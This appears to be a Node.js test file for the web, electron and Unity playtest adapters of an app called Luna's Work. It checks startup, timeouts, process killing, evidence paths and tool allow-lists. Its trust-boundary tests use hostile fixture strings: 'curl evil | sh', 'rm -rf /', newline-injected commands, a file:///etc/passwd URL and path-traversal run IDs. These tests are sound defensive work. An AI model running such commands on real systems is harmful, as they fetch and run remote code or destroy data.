// ============================================================================
// Luna's Work tester adapters: the web adapter's start / readiness / timeout /
// crash / stop-the-tree paths with fake spawn, fetch and clock; the evidence
// dir that cannot escape the runs folder; the profile-only start command.
// The electron adapter (fake spawn + fake control channel) and the unity
// adapter (fake Unity MCP); their tool lists; evidence per iteration; scene
// work routed to the one scene worker; the UnityYAMLMerge driver config; the
// PlaytestDriver card.
// Disk writes go to a temp runs root, never the real config/ directory.
// ============================================================================

'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { EventEmitter } = require('events');
const { PassThrough } = require('stream');

const A = require('../src/lunasworkAdapters.js');

const tmpDir = (prefix) => fs.mkdtempSync(path.join(os.tmpdir(), prefix));
const goodProfile = { adapter: 'web', startCommand: 'npm run dev', url: 'http://localhost:5173', readyTimeoutSec: 5 };

function fakeChild(pid = 4242) {
  const child = new EventEmitter();
  child.pid = pid;
  child.stdout = new PassThrough();
  child.stderr = new PassThrough();
  return child;
}

/**
 * A fake world: a clock advanced only by sleep, a spawn that records its calls,
 * a fetch answering from `statuses` (null = connection refused), and kill
 * recorders for both platforms.
 */
function fakeWorld({ statuses = [200], platform = 'win32', onSpawn } = {}) {
  const world = { t: 0, spawns: [], fetches: 0, execCalls: [], killCalls: [], child: null };
  const queue = [...statuses];
  world.opts = {
    projectDir: tmpDir('lw-project-'),
    runsRoot: path.join(tmpDir('lw-runs-'), 'runs'),
    runId: 'abc123',
    iteration: 1,
    platform,
    now: () => world.t,
    sleep: async (ms) => {
      world.t += ms;
    },
    spawn: (cmd, options) => {
      world.child = fakeChild();
      world.spawns.push({ cmd, options });
      if (onSpawn) onSpawn(world.child);
      return world.child;
    },
    fetch: async () => {
      world.fetches += 1;
      const status = queue.length > 1 ? queue.shift() : queue[0];
      if (status === null) throw new Error('ECONNREFUSED');
      return { status };
    },
    execFile: (file, args, options, cb) => {
      world.execCalls.push({ file, args });
      cb(null);
    },
    kill: (pid, signal) => {
      world.killCalls.push({ pid, signal });
    },
  };
  return world;
}

// ---- start / readiness --------------------------------------------------------------

test('web adapter starts, waits until the url answers, and returns it', async () => {
  const world = fakeWorld({ statuses: [null, null, 503, 200] });
  const adapter = A.createAdapter('web', world.opts);
  const result = await adapter.start(goodProfile);

  assert.deepEqual(result, { url: 'http://localhost:5173' });
  assert.equal(world.fetches, 4);
  assert.equal(world.spawns.length, 1);
  assert.equal(world.spawns[0].options.cwd, world.opts.projectDir);
  assert.equal(world.spawns[0].options.shell, true);
  await adapter.stop();
});

test('a 3xx redirect counts as ready', async () => {
  const world = fakeWorld({ statuses: [302] });
  const adapter = A.createAdapter('web', world.opts);
  assert.deepEqual(await adapter.start(goodProfile), { url: goodProfile.url });
  await adapter.stop();
});

test('readiness timeout stops the tree and rejects with a clear error', async () => {
  const world = fakeWorld({ statuses: [null] });
  const adapter = A.createAdapter('web', world.opts);

  await assert.rejects(adapter.start(goodProfile), /did not answer at http:\/\/localhost:5173 within 5s/);
  assert.ok(world.t >= 5000, 'waited the whole readyTimeoutSec');
  assert.deepEqual(world.execCalls, [{ file: 'taskkill', args: ['/PID', '4242', '/T', '/F'] }]);
});

test('a crash before ready rejects with the exit code and does not poll forever', async () => {
  const world = fakeWorld({
    statuses: [null],
    onSpawn: (child) => setImmediate(() => child.emit('exit', 1, null)),
  });
  // Let the exit event land before the second poll.
  world.opts.sleep = (ms) =>
    new Promise((resolve) =>
      setImmediate(() => {
        world.t += ms;
        resolve();
      }),
    );
  const adapter = A.createAdapter('web', world.opts);

  await assert.rejects(adapter.start(goodProfile), /exited before it was ready \(code 1/);
  assert.ok(world.t < 5000, 'gave up as soon as the app died');
  assert.equal(world.execCalls.length, 0, 'nothing left to kill');
});

// ---- LW 2.21a: seed before the Playtester -----------------------------------------------

/** A world whose spawn exits the seed command with `seedCode`; the app child stays up. */
function seedWorld(seedCode, statuses = [200]) {
  const world = fakeWorld({ statuses });
  const spawn = world.opts.spawn;
  world.order = [];
  world.opts.spawn = (cmd, options) => {
    const child = spawn(cmd, options);
    world.order.push(cmd);
    if (cmd === 'npm run seed') setImmediate(() => child.emit('exit', seedCode, null));
    return child;
  };
  return world;
}

test('LW 2.21a: the seedCommand runs to completion in the project dir before the app starts', async () => {
  const world = seedWorld(0);
  const adapter = A.createAdapter('web', world.opts);
  const result = await adapter.start({ ...goodProfile, seedCommand: 'npm run seed' });

  assert.deepEqual(result, { url: 'http://localhost:5173' });
  assert.deepEqual(world.order, ['npm run seed', 'npm run dev'], 'seed first, then the app');
  assert.equal(world.spawns[0].options.cwd, world.opts.projectDir);
  assert.equal(world.spawns[0].options.shell, true);
  await adapter.stop();
  const log = fs.readFileSync(path.join(adapter.evidenceDir, A.SERVER_LOG), 'utf8');
  assert.match(log, /seed \$ npm run seed/);
  assert.match(log, /seed exited code=0/);
});

test('LW 2.21a: a failing seed fails the start and the app is never launched', async () => {
  const world = seedWorld(2);
  const adapter = A.createAdapter('web', world.opts);

  await assert.rejects(adapter.start({ ...goodProfile, seedCommand: 'npm run seed' }), /seed command exited with code 2/);
  assert.deepEqual(world.order, ['npm run seed'], 'no app process');
  assert.equal(world.fetches, 0, 'never polled');
});

test('LW 2.21a: without a seedCommand only the app is spawned', async () => {
  const world = seedWorld(0);
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);
  assert.deepEqual(world.order, ['npm run dev']);
  await adapter.stop();
});

test('stdout and stderr go to server.log in the evidence dir', async () => {
  const world = fakeWorld({
    statuses: [null, 200],
    onSpawn: (child) => {
      child.stdout.write('vite ready\n');
      child.stderr.write('warn: something\n');
    },
  });
  // One real tick between polls, so the streams flow before stop().
  world.opts.sleep = (ms) =>
    new Promise((resolve) =>
      setImmediate(() => {
        world.t += ms;
        resolve();
      }),
    );
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);
  await adapter.stop();
  // Output after stop is dropped, not a write-after-end crash.
  world.child.stdout.write('late output\n');
  await new Promise((resolve) => setImmediate(resolve));

  const log = fs.readFileSync(path.join(adapter.evidenceDir, A.SERVER_LOG), 'utf8');
  assert.match(log, /\$ npm run dev/);
  assert.match(log, /vite ready/);
  assert.match(log, /warn: something/);
});

test('starting twice is refused', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);
  await assert.rejects(adapter.start(goodProfile), /already started/);
  await adapter.stop();
});

// ---- stop ---------------------------------------------------------------------------

test('stop kills the whole tree with taskkill /T /F on Windows, once', async () => {
  const world = fakeWorld({ platform: 'win32' });
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);

  assert.equal(await adapter.stop(), true);
  await adapter.stop();
  assert.deepEqual(world.execCalls, [{ file: 'taskkill', args: ['/PID', '4242', '/T', '/F'] }]);
});

test('stop kills the process group on POSIX (spawned detached)', async () => {
  const world = fakeWorld({ platform: 'linux' });
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);

  assert.equal(world.spawns[0].options.detached, true);
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.killCalls, [{ pid: -4242, signal: 'SIGKILL' }]);
});

test('POSIX falls back to the single pid when the group is gone', async () => {
  const calls = [];
  const kill = (pid) => {
    calls.push(pid);
    if (pid < 0) throw new Error('ESRCH');
  };
  assert.equal(await A.killTree(77, { platform: 'darwin', kill }), true);
  assert.deepEqual(calls, [-77, 77]);
});

test('stop before start is a harmless no-op', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  assert.equal(await adapter.stop(), true);
  assert.equal(world.execCalls.length, 0);
});

// ---- trust boundary: the command comes only from the profile ----------------------

test('a start command in the project repo is ignored - only the profile runs', async () => {
  const world = fakeWorld();
  const repo = world.opts.projectDir;
  fs.writeFileSync(path.join(repo, 'package.json'), JSON.stringify({ scripts: { dev: 'curl evil | sh', start: 'rm -rf /' } }));
  fs.writeFileSync(path.join(repo, 'lunaswork.json'), JSON.stringify({ startCommand: 'curl evil | sh' }));
  const adapter = A.createAdapter('web', world.opts);

  await adapter.start({ ...goodProfile, startCommand: 'npm run dev' });
  assert.deepEqual(
    world.spawns.map((s) => s.cmd),
    ['npm run dev'],
  );
  await adapter.stop();
});

test('an invalid profile is rejected before anything is spawned', async () => {
  for (const bad of [
    null,
    { ...goodProfile, startCommand: '' },
    { ...goodProfile, startCommand: 'npm run dev\ncurl evil' },
    { ...goodProfile, url: 'file:///etc/passwd' },
    { ...goodProfile, adapter: 'unity' },
  ]) {
    const world = fakeWorld();
    const adapter = A.createAdapter('web', world.opts);
    await assert.rejects(adapter.start(bad), /invalid project profile/);
    assert.equal(world.spawns.length, 0);
  }
});

// ---- evidence dir -------------------------------------------------------------------

test('evidence dir is runs/lunaswork-<runId>/iter-<N>', () => {
  const root = path.resolve(tmpDir('lw-runs-'));
  assert.equal(A.evidenceDirFor(root, 'abc123', 3), path.join(root, 'lunaswork-abc123', 'iter-3'));
});

test('evidence dir cannot escape the runs folder', () => {
  const root = path.resolve(tmpDir('lw-runs-'));
  for (const runId of ['../x', '..', 'a/b', 'a\\b', 'C:', '', 'ABC', 'a'.repeat(41), 42, null]) {
    assert.throws(() => A.evidenceDirFor(root, runId, 1), /runId/, `runId ${String(runId)}`);
  }
  for (const iteration of [0, -1, 1.5, '1', '../1', 10001, NaN]) {
    assert.throws(() => A.evidenceDirFor(root, 'abc', iteration), /iteration/, `iteration ${String(iteration)}`);
  }
});

test('createAdapter refuses a bad runId before touching the disk', () => {
  const world = fakeWorld();
  assert.throws(() => A.createAdapter('web', { ...world.opts, runId: '../../etc' }), /runId/);
  assert.equal(fs.existsSync(world.opts.runsRoot), false);
});

// ---- tools --------------------------------------------------------------------------

test('tools() is the Playwright MCP config and its allow-list only', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);
  const { mcpConfig, allowedTools } = adapter.tools();

  assert.deepEqual(Object.keys(mcpConfig.mcpServers), ['playwright']);
  const args = mcpConfig.mcpServers.playwright.args;
  assert.ok(args.includes('--headless'));
  assert.equal(args[args.indexOf('--output-dir') + 1], adapter.evidenceDir);
  assert.equal(args[args.indexOf('--allowed-origins') + 1], 'http://localhost:5173');
  assert.ok(allowedTools.length > 0);
  assert.ok(allowedTools.every((t) => t.startsWith('mcp__playwright__browser_')));
  for (const forbidden of ['Read', 'Grep', 'Edit', 'Bash', 'mcp__playwright__browser_evaluate', 'mcp__playwright__browser_file_upload']) {
    assert.ok(!allowedTools.includes(forbidden), forbidden);
  }
  await adapter.stop();
});

test('tools() returns fresh objects - editing one does not widen the next', () => {
  const adapter = A.createAdapter('web', fakeWorld().opts);
  adapter.tools().allowedTools.push('Bash');
  assert.ok(!adapter.tools().allowedTools.includes('Bash'));
});

// ---- unknown adapters ---------------------------------------------------------------

test('web, electron and unity exist; anything else is unknown', () => {
  const opts = fakeWorld().opts;
  assert.deepEqual(A.ADAPTER_NAMES, ['web', 'electron', 'unity']);
  assert.equal(A.createAdapter('electron', opts).name, 'electron');
  assert.equal(A.createAdapter('unity', opts).name, 'unity');
  assert.throws(() => A.createAdapter('ssh', opts), /unknown tester adapter 'ssh'/);
  assert.throws(() => A.createAdapter('__proto__', opts), /unknown tester adapter/);
});

test('projectDir must be absolute', () => {
  const opts = fakeWorld().opts;
  assert.throws(() => A.createAdapter('web', { ...opts, projectDir: 'relative/dir' }), /absolute/);
});

// ---- browser matrix -------------------------------------------------------------------

test('tools({matrix}) starts one Playwright MCP per engine with --browser and the viewport', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  await adapter.start(goodProfile);
  const matrix = [
    { engine: 'chromium', device: 'desktop', width: 1440, height: 900 },
    { engine: 'firefox', device: 'tablet', width: 820, height: 1180 },
  ];
  const { mcpConfig, allowedTools } = adapter.tools({ matrix });
  const servers = mcpConfig.mcpServers;
  assert.deepEqual(Object.keys(servers), ['playwright', 'playwright-firefox']);

  const after = (args, flag) => args[args.indexOf(flag) + 1];
  assert.equal(after(servers.playwright.args, '--browser'), 'chromium');
  assert.equal(after(servers.playwright.args, '--viewport-size'), '1440x900');
  assert.equal(after(servers['playwright-firefox'].args, '--browser'), 'firefox');
  assert.equal(after(servers['playwright-firefox'].args, '--viewport-size'), '820x1180');
  for (const s of Object.values(servers)) {
    assert.equal(after(s.args, '--allowed-origins'), 'http://localhost:5173', 'every engine is origin-locked');
  }
  assert.ok(allowedTools.includes('mcp__playwright-firefox__browser_click'));
  assert.ok(!allowedTools.some((t) => t.endsWith('browser_evaluate')));
  await adapter.stop();
});

test('tools() without a matrix is the chromium desktop baseline; unknown engines are dropped', () => {
  const adapter = A.createAdapter('web', fakeWorld().opts);
  const base = adapter.tools().mcpConfig.mcpServers;
  assert.deepEqual(Object.keys(base), ['playwright']);
  assert.ok(base.playwright.args.join(' ').includes('--browser chromium --viewport-size 1440x900'));
  const bad = adapter.tools({ matrix: [{ engine: 'ie6', width: 800, height: 600 }, { engine: 'webkit', width: -1, height: 9 }] });
  assert.deepEqual(Object.keys(bad.mcpConfig.mcpServers), ['playwright']);
});

test('ensureBrowsers installs missing engines once, logged, then skips', async () => {
  const world = fakeWorld();
  const adapter = A.createAdapter('web', world.opts);
  const matrix = [{ engine: 'chromium', width: 1440, height: 900 }, { engine: 'webkit', width: 390, height: 844 }];

  const first = await adapter.ensureBrowsers(matrix);
  assert.deepEqual(first, { ok: true, installed: ['chromium', 'webkit'] });
  assert.equal(world.execCalls.length, 1);
  assert.equal(world.execCalls[0].file, 'npx -y --package=@playwright/mcp@latest playwright install chromium webkit');
  const log = fs.readFileSync(path.join(adapter.evidenceDir, A.BROWSERS_LOG), 'utf8');
  assert.match(log, /first use of chromium, webkit/);
  assert.match(log, /installed chromium, webkit/);

  const again = await adapter.ensureBrowsers(matrix);
  assert.deepEqual(again, { ok: true, installed: [] });
  assert.equal(world.execCalls.length, 1, 'no second install');

  await adapter.ensureBrowsers([{ engine: 'firefox', width: 820, height: 1180 }]);
  assert.match(world.execCalls[1].file, /playwright install firefox$/);
});

test('ensureBrowsers reports a failed install and does not record it', async () => {
  const world = fakeWorld();
  world.opts.execFile = (file, args, options, cb) => {
    world.execCalls.push({ file, args });
    cb(new Error('network down'));
  };
  const adapter = A.createAdapter('web', world.opts);
  const res = await adapter.ensureBrowsers([{ engine: 'firefox', width: 820, height: 1180 }]);
  assert.equal(res.ok, false);
  assert.match(res.error, /network down/);
  assert.equal(fs.existsSync(path.join(world.opts.runsRoot, A.BROWSERS_MARKER)), false);
  assert.match(fs.readFileSync(path.join(adapter.evidenceDir, A.BROWSERS_LOG), 'utf8'), /install failed/);
});

test('ensureBrowsers runs outside the project and reinstalls once the marker is a day old', async () => {
  const world = fakeWorld();
  const calls = [];
  world.opts.execFile = (file, args, options, cb) => {
    calls.push(options);
    cb(null);
  };
  const adapter = A.createAdapter('web', world.opts);
  const matrix = [{ engine: 'chromium', width: 1440, height: 900 }];
  await adapter.ensureBrowsers(matrix);
  assert.equal(path.resolve(calls[0].cwd), path.resolve(world.opts.runsRoot));

  world.t += 60 * 60 * 1000;
  await adapter.ensureBrowsers(matrix);
  assert.equal(calls.length, 1, 'fresh marker: skipped');
  world.t += 24 * 60 * 60 * 1000;
  await adapter.ensureBrowsers(matrix);
  assert.equal(calls.length, 2, 'expired marker: installed again');
});

// ============================================================================
// electron adapter (LW 3.35)
// ============================================================================

const PNG = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.from('fake image')]).toString('base64');
const READY_LINE = '[luna-playtest] ready {"port":51234,"windows":1}\n';
const TOKEN = 'a'.repeat(64);
const electronProfile = { adapter: 'electron', startCommand: 'npm start', readyTimeoutSec: 5 };

/** One real tick per sleep, so stream data and exit events land between polls. */
const tickingSleep = (world) => (ms) =>
  new Promise((resolve) =>
    setImmediate(() => {
      world.t += ms;
      resolve();
    }),
  );

/**
 * fakeWorld plus the wrapper's control channel: the app prints the ready line
 * (unless `ready` is false) and answers list_windows / screenshot / quit.
 * `exitOnQuit` false = an app (or the npm around it) that ignores the quit.
 */
function electronWorld({ ready = true, exitOnQuit = true, platform = 'win32', iteration = 1, runsRoot, onSpawn } = {}) {
  const world = fakeWorld({
    platform,
    onSpawn: (child) => {
      if (ready) child.stdout.write(`electron booting\n${READY_LINE}`);
      if (onSpawn) onSpawn(child);
    },
  });
  world.controlCalls = [];
  world.opts.iteration = iteration;
  if (runsRoot) world.opts.runsRoot = runsRoot;
  world.opts.sleep = tickingSleep(world);
  world.opts.env = { PATH: 'x', NODE_OPTIONS: '--max-old-space-size=4096', ELECTRON_RUN_AS_NODE: '1' };
  world.opts.newToken = () => TOKEN;
  world.opts.nodeBinary = 'C:\\LunaCore\\LunaCore.exe';
  world.opts.callControl = async (control, tool, args) => {
    world.controlCalls.push({ control, tool, args });
    if (tool === 'list_windows') return { windows: [{ id: 1, title: 'Main' }, { id: 2, title: 'Settings' }] };
    if (tool === 'screenshot') return { png: PNG, width: 800, height: 600 };
    if (tool === 'quit') {
      if (exitOnQuit) setImmediate(() => world.child.emit('exit', 0, null));
      return { quitting: true };
    }
    throw new Error(`unexpected control call ${tool}`);
  };
  return world;
}

const E = require('../src/lunasworkElectron.js');
const U = require('../src/lunasworkUnity.js');
const Scene = require('../src/lunasworkScene.js');
const { BRIDGE_PATH, WRAPPER_PATH, SERVER_NAMES } = require('../src/lunasworkBridge.js');
const { toolNames } = require('../helpers/playtest-bridge/tools.js');
const { createBridge, unityBackend } = require('../helpers/playtest-bridge/bridge.js');
const UN = require('../helpers/playtest-bridge/unity.js');
const { normalizeTodo, runTag } = require('../src/todorows.js');
const { createGodModeBuilder } = require('../src/lunasworkBuild.js');

const isPng = (file) => fs.readFileSync(file).subarray(0, 4).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47]));

test('electron start launches the profile command with the in-process wrapper and waits for the first window', async () => {
  const world = electronWorld();
  const adapter = A.createAdapter('electron', world.opts);
  const res = await adapter.start(electronProfile);

  assert.deepEqual(res, { handle: { kind: 'electron', pid: 4242, windows: 1 } });
  assert.equal(world.spawns.length, 1);
  const { cmd, options } = world.spawns[0];
  assert.equal(cmd, 'npm start');
  assert.equal(options.cwd, world.opts.projectDir);
  assert.equal(options.shell, true);
  // No CDP port: the wrapper is preloaded into the app's main process.
  assert.equal(options.env.NODE_OPTIONS, E.nodeOptionsWith('--max-old-space-size=4096', WRAPPER_PATH));
  assert.ok(options.env.NODE_OPTIONS.startsWith('--max-old-space-size=4096 --require "'));
  assert.ok(!/remote-debugging-port|--inspect/.test(`${cmd} ${options.env.NODE_OPTIONS}`));
  assert.equal(options.env.LUNA_PLAYTEST_TOKEN, TOKEN);
  assert.equal('ELECTRON_RUN_AS_NODE' in options.env, false, 'the app must not start as plain Node');
  assert.equal(world.opts.env.ELECTRON_RUN_AS_NODE, '1', "LunaCore's own env is not touched");

  const control = JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, E.CONTROL_FILE), 'utf8'));
  assert.deepEqual(control, { port: 51234, token: TOKEN });
  await adapter.stop();
});

test('electron stop takes final screenshots, quits, then kills the whole tree once', async () => {
  const world = electronWorld({ exitOnQuit: false });
  const adapter = A.createAdapter('electron', world.opts);
  await adapter.start(electronProfile);

  assert.equal(await adapter.stop(), true);
  await adapter.stop();
  assert.deepEqual(
    world.controlCalls.map((c) => [c.tool, c.args]),
    [
      ['list_windows', {}],
      ['screenshot', { name: 'final-1.png', windowId: 1 }],
      ['screenshot', { name: 'final-2.png', windowId: 2 }],
      ['quit', {}],
    ],
  );
  assert.ok(world.controlCalls.every((c) => c.control.port === 51234 && c.control.token === TOKEN));
  assert.deepEqual(world.execCalls, [{ file: 'taskkill', args: ['/PID', '4242', '/T', '/F'] }]);
  assert.ok(isPng(path.join(adapter.evidenceDir, 'final-1.png')));
  assert.ok(isPng(path.join(adapter.evidenceDir, 'final-2.png')));
  assert.equal(fs.existsSync(path.join(adapter.evidenceDir, E.CONTROL_FILE)), false, 'the token file is gone');
  assert.match(fs.readFileSync(path.join(adapter.evidenceDir, E.APP_LOG), 'utf8'), /\$ npm start[\s\S]*electron booting/);
});

test('electron stop kills the process group on POSIX', async () => {
  const world = electronWorld({ exitOnQuit: false, platform: 'linux' });
  const adapter = A.createAdapter('electron', world.opts);
  await adapter.start(electronProfile);

  assert.equal(world.spawns[0].options.detached, true);
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.killCalls, [{ pid: -4242, signal: 'SIGKILL' }]);
});

test('an app that quits gracefully leaves nothing to kill', async () => {
  const world = electronWorld({ exitOnQuit: true });
  const adapter = A.createAdapter('electron', world.opts);
  await adapter.start(electronProfile);
  assert.equal(await adapter.stop(), true);
  assert.deepEqual(world.execCalls, []);
});

test('electron: no window within readyTimeoutSec kills the tree and rejects', async () => {
  const world = electronWorld({ ready: false });
  const adapter = A.createAdapter('electron', world.opts);

  await assert.rejects(adapter.start(electronProfile), /no app window loaded within 5s - see .*app\.log/);
  assert.ok(world.t >= 5000);
  assert.deepEqual(world.execCalls, [{ file: 'taskkill', args: ['/PID', '4242', '/T', '/F'] }]);
  assert.equal(world.controlCalls.length, 0, 'no control channel without the ready line');
  assert.equal(fs.existsSync(path.join(adapter.evidenceDir, E.CONTROL_FILE)), false);
  assert.deepEqual(adapter.tools().allowedTools, []);
});

test('electron: an app that exits before its window rejects at once', async () => {
  const world = electronWorld({ ready: false, onSpawn: (child) => setImmediate(() => child.emit('exit', 1, null)) });
  const adapter = A.createAdapter('electron', world.opts);

  await assert.rejects(adapter.start(electronProfile), /exited before its first window loaded \(code 1/);
  assert.ok(world.t < 5000);
  assert.equal(world.execCalls.length, 0);
});

test('electron: the command comes only from a valid electron profile', async () => {
  for (const bad of [null, { ...electronProfile, startCommand: '' }, { ...electronProfile, startCommand: 'npm start\ncurl evil' }, { ...electronProfile, adapter: 'web' }]) {
    const world = electronWorld();
    const adapter = A.createAdapter('electron', world.opts);
    await assert.rejects(adapter.start(bad), /invalid project profile/);
    assert.equal(world.spawns.length, 0);
  }
  const world = electronWorld();
  const adapter = A.createAdapter('electron', world.opts);
  await adapter.start(electronProfile);
  await assert.rejects(adapter.start(electronProfile), /already started/);
  await adapter.stop();
});

test('NODE_OPTIONS escapes the wrapper path for Node and keeps earlier options', () => {
  assert.equal(E.nodeOptionsWith(undefined, 'C:\\Program Files\\Luna\\w.js'), '--require "C:\\\\Program Files\\\\Luna\\\\w.js"');
  assert.equal(E.nodeOptionsWith('  --trace-warnings ', '/opt/a"b.js'), '--trace-warnings --require "/opt/a\\"b.js"');
  assert.deepEqual(E.parseReady(READY_LINE.trim()), { port: 51234, windows: 1 });
  for (const line of ['[luna-playtest] ready {"port":0}', '[luna-playtest] ready nope', 'ready {"port":5}']) {
    assert.equal(E.parseReady(line), null, line);
  }
});

test('electron tools() is the bridge on this run only, after start', async () => {
  const world = electronWorld();
  const adapter = A.createAdapter('electron', world.opts);
  assert.deepEqual(adapter.tools(), { mcpConfig: { mcpServers: {} }, allowedTools: [] }, 'nothing before start');
  await adapter.start(electronProfile);

  const { mcpConfig, allowedTools } = adapter.tools();
  const server = mcpConfig.mcpServers[SERVER_NAMES.electron];
  assert.deepEqual(Object.keys(mcpConfig.mcpServers), [SERVER_NAMES.electron]);
  assert.equal(server.command, world.opts.nodeBinary);
  assert.deepEqual(server.args, [
    BRIDGE_PATH,
    '--backend', 'electron',
    '--evidence-dir', adapter.evidenceDir,
    '--control', path.join(adapter.evidenceDir, E.CONTROL_FILE),
  ]);
  assert.equal(server.env.ELECTRON_RUN_AS_NODE, '1');
  assert.deepEqual(allowedTools, toolNames('electron').map((t) => `mcp__${SERVER_NAMES.electron}__${t}`));
  await adapter.stop();
  assert.deepEqual(adapter.tools().allowedTools, [], 'nothing after stop');
});

// ============================================================================
// unity adapter (LW 3.36b) - a fake Unity MCP (MCP for Unity's answer shape)
// ============================================================================

// Legacy MCP for Unity: the profile names the server's url. Without one the
// adapter talks to the official Unity MCP (Unity Pipeline) - see below.
const unityProfile = { adapter: 'unity', unityMcpUrl: 'http://127.0.0.1:8080/mcp', scene: 'Assets/Scenes/Level1.unity', readyTimeoutSec: 5 };
const unityReply = (data) => ({ content: [{ type: 'text', text: JSON.stringify({ success: true, message: 'ok', data }) }] });

function fakeUnity({ playingAfter = 2, driver = true, state = { scene: 'Level1', score: 3 } } = {}) {
  const u = { calls: [], urls: [], sessions: 0, closed: 0, polls: 0 };
  u.connect = (url) => {
    u.sessions += 1;
    u.urls.push(url);
    return {
      callTool: async (name, args) => {
        u.calls.push([name, args]);
        if (name === 'manage_editor' && args.action === 'get_state') {
          u.polls += 1;
          return unityReply({ isPlaying: u.polls >= playingAfter });
        }
        if (name === 'manage_editor' || name === 'manage_scene') return unityReply({});
        if (name === 'read_console') return unityReply([{ type: 'error', message: 'NullReferenceException in Enemy.Update' }]);
        if (name === 'execute_custom_tool') {
          if (!driver) return { isError: true, content: [{ type: 'text', text: "Tool 'playtest_driver' not found" }] };
          const { action, steps } = args.parameters;
          if (action === 'state') return unityReply(state);
          if (action === 'screenshot') return unityReply({ png: PNG, width: 1920, height: 1080 });
          if (action === 'input') return unityReply({ done: steps.length });
        }
        throw new Error(`unexpected Unity MCP call ${name}`);
      },
      close: async () => {
        u.closed += 1;
      },
    };
  };
  return u;
}

function unityWorld(unityOpts, { iteration = 1, runsRoot } = {}) {
  const world = fakeWorld();
  world.unity = fakeUnity(unityOpts);
  world.logs = [];
  world.opts.iteration = iteration;
  if (runsRoot) world.opts.runsRoot = runsRoot;
  world.opts.connectUnity = world.unity.connect;
  world.opts.nodeBinary = 'C:\\LunaCore\\LunaCore.exe';
  world.opts.log = (line) => world.logs.push(line);
  return world;
}

const callNames = (calls) => calls.map(([name, args]) => `${name}:${args.action || args.parameters.action}`);

test('unity start opens the scene, enters play mode, waits for it and checks the PlaytestDriver - one session', async () => {
  const world = unityWorld();
  const adapter = A.createAdapter('unity', world.opts);
  const res = await adapter.start(unityProfile);

  assert.deepEqual(res, { handle: { kind: 'unity', scene: 'Assets/Scenes/Level1.unity' } });
  assert.deepEqual(callNames(world.unity.calls), [
    'manage_scene:load',
    'manage_editor:play',
    'manage_editor:get_state',
    'manage_editor:get_state',
    'execute_custom_tool:state',
  ]);
  assert.equal(world.unity.calls[0][1].path, 'Assets/Scenes/Level1.unity');
  assert.deepEqual([world.unity.sessions, world.unity.closed], [1, 1], 'one editor = one connection, closed again');
  assert.deepEqual(world.unity.urls, ['http://127.0.0.1:8080/mcp']);
  assert.equal(world.spawns.length, 0, 'nothing is launched: the editor is already open');
  await adapter.stop();
});

test('unity stop saves console, state and a final screenshot, then leaves play mode once', async () => {
  const world = unityWorld();
  const adapter = A.createAdapter('unity', world.opts);
  await adapter.start(unityProfile);
  world.unity.calls.length = 0;

  assert.equal(await adapter.stop(), true);
  await adapter.stop();
  assert.deepEqual(callNames(world.unity.calls), [
    'read_console:get',
    'execute_custom_tool:state',
    'execute_custom_tool:screenshot',
    'manage_editor:stop',
  ]);
  const consoleDump = JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, U.CONSOLE_FILE), 'utf8'));
  assert.match(JSON.stringify(consoleDump), /NullReferenceException/);
  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, U.STATE_FILE), 'utf8')), { scene: 'Level1', score: 3 });
  assert.ok(isPng(path.join(adapter.evidenceDir, U.FINAL_SHOT)));
  assert.deepEqual(adapter.tools().allowedTools, []);
});

test('unity combatFeelLog() reads the clean log in one session; none before start or without a log', async () => {
  const state = { scene: 'Arena', combatFeelLog: [{ inputLatencyMs: 40, junk: 1 }, { inputLatencyMs: -3 }] };
  const world = unityWorld({ state });
  const adapter = A.createAdapter('unity', world.opts);
  assert.equal(await adapter.combatFeelLog(), null, 'not started');
  await adapter.start(unityProfile);
  const sessions = world.unity.sessions;
  assert.deepEqual(await adapter.combatFeelLog(), [{ inputLatencyMs: 40 }]);
  assert.equal(world.unity.sessions, sessions + 1);
  await adapter.stop();
  assert.deepEqual(JSON.parse(fs.readFileSync(path.join(adapter.evidenceDir, U.STATE_FILE), 'utf8')),
    { scene: 'Arena', combatFeelLog: [{ inputLatencyMs: 40 }] }, 'the evidence state is cleaned too');

  const plain = unityWorld();
  const noLog = A.createAdapter('unity', plain.opts);
  await noLog.start(unityProfile);
  assert.equal(await noLog.combatFeelLog(), null);
  await noLog.stop();
});

test('unity tools() is the bridge on the profile Unity MCP url, after start', async () => {
  const world = unityWorld();
  const adapter = A.createAdapter('unity', world.opts);
  assert.deepEqual(adapter.tools().allowedTools, [], 'nothing before play mode');
  await adapter.start({ ...unityProfile, unityMcpUrl: 'http://localhost:6400/mcp' });

  const { mcpConfig, allowedTools } = adapter.tools();
  assert.deepEqual(Object.keys(mcpConfig.mcpServers), [SERVER_NAMES.unity]);
  assert.deepEqual(mcpConfig.mcpServers[SERVER_NAMES.unity].args, [
    BRIDGE_PATH,
    '--backend', 'unity',
    '--evidence-dir', adapter.evidenceDir,
    '--unity-url', 'http://localhost:6400/mcp',
  ]);
  assert.deepEqual(allowedTools, toolNames('unity').map((t) => `mcp__${SERVER_NAMES.unity}__${t}`));
  await adapter.stop();
});

test('unity play / screenshot / console / input through the bridge, one short session per call', async () => {
  const unity = fakeUnity();
  const evidenceDir = tmpDir('lw-unity-ev-');
  const slept = [];
  const bridge = createBridge({
    backend: 'unity',
    evidenceDir,
    invoke: unityBackend({ connect: () => unity.connect('http://127.0.0.1:8080/mcp'), sleep: async (ms) => slept.push(ms) }),
  });

  const shot = await bridge.callTool('screenshot', { name: 'f1-pause-menu' });
  assert.equal(shot.isError, undefined);
